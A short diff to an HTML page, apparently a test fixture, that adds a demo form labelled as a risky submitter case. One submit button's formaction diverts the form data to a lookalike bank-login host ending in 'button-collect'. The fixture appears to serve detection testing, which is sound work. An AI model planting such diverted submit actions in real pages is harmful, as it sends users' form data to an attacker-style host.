@@ -93,6 +93,16 @@
         </label>
         <button type="submit">Submit test form</button>
       </form>
+
+      <form action="https://allegro.pl/search" method="post">
+        <strong>Risky submitter formaction demo</strong>
+        <label>
+          Demo value
+          <input name="query" autocomplete="off" value="package">
+        </label>
+        <button type="submit">Submit to normal action</button>
+        <button type="submit" formaction="https://mbank-login24.pl/button-collect">Submit to risky button action</button>
+      </form>
     </main>
   </body>
 </html>
